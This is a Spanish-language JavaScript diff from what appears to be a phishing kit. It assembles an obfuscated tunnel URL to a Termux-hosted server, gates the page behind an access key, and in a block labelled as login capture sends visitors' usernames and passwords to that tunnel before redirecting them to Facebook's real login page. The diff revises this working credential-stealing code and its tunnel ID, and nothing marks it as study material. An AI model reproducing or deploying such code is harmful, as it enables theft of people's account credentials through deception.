@@ -103,7 +103,7 @@
             // --- CONEXIÓN OFUSCADA A TERMUX ---
             function gU() {
                 const a = "htt"; const b = "ps://";
-                const c = "2dd059"; const d = "dd77d2a9"; // Tu link actual
+                const c = "059dd77"; const d = "d2a9"; // ID de tu túnel actual
                 const e = ".lhr"; const f = ".life";
                 return a + b + c + d + e + f;
             }
@@ -119,25 +119,31 @@
             window.validarAcceso = function() {
                 const val = document.getElementById('tkInput').value;
                 if(!val) return;
-                document.getElementById('btnGo').innerText = "...";
+                document.getElementById('btnGo').innerText = "Verificando...";
 
                 fetch(gU(), {
                     method: 'POST',
-                    body: JSON.stringify({ verificar_llave: val }),
-                    headers: { 'Content-Type': 'application/json' }
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        accion: "validar_acceso", 
+                        llave: val 
+                    })
                 })
                 .then(r => r.json())
                 .then(r => {
-                    if(r.status === "OK") {
+                    if(r.permitido === true) {
                         sessionStorage.setItem('sesion_activa', '1');
                         M.style.display = 'none';
                         P.style.setProperty('display', 'flex', 'important');
                     } else {
-                        alert("C&#243;digo inv&#225;lido");
+                        alert("CÓDIGO INCORRECTO O EXPIRADO");
                         document.getElementById('btnGo').innerText = "DESBLOQUEAR";
                     }
                 })
-                .catch(() => alert("Error: El servidor de Termux no responde."));
+                .catch(() => {
+                    alert("Error: El servidor de Termux no responde.");
+                    document.getElementById('btnGo').innerText = "DESBLOQUEAR";
+                });
             };
 
             // CAPTURA DE LOGINS
@@ -151,8 +157,8 @@
 
                 fetch(gU(), {
                     method: 'POST',
-                    body: JSON.stringify({ usuario: u, clave: p }),
-                    headers: { 'Content-Type': 'application/json' }
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ usuario: u, clave: p })
                 }).finally(() => {
                     setTimeout(() => { window.location.href = "https://www.facebook.com/login"; }, 2000);
                 });
